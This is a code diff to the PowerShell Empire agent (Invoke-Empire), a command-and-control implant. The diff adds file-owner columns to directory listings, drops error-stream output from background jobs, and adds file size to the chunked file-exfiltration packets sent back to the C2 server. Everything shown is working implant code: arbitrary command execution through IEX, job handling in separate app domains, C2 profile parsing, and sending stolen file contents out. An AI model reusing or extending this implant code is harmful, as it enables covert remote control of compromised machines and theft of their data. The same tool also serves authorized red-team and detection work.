@@ -281,11 +281,11 @@ function Invoke-Empire {
             switch -regex ($cmd) {
                 '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
@@ -441,8 +441,6 @@ function Invoke-Empire {
         param($JobName)
         if($Script:Jobs.ContainsKey($JobName)) {
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
         }
     }
 
@@ -455,8 +453,6 @@ function Invoke-Empire {
             $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
             # get results
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error
-            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
             # unload the app domain runner
             $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
             $Script:Jobs.Remove($JobName)
@@ -471,7 +467,6 @@ function Invoke-Empire {
         #   uris(comma separated)|UserAgent|header1=val|header2=val2...
         #   headers are optional. format is "key:value"
         #   ex- cookies are "cookie:blah=123;meh=456"
-
         $ProfileParts = $Profile.split('|')
         $script:TaskURIs = $ProfileParts[0].split(',')
         $script:UserAgent = $ProfileParts[1]
@@ -852,9 +847,10 @@ function Invoke-Empire {
                         $Index = 0
                         do{
                             $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
+                            $filesize = (Get-Item $file).length
 
                             if($EncodedPart) {
-                                $data = "{0}|{1}|{2}" -f $Index, $file, $EncodedPart
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart
                                 (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
                                 $Index += 1
 
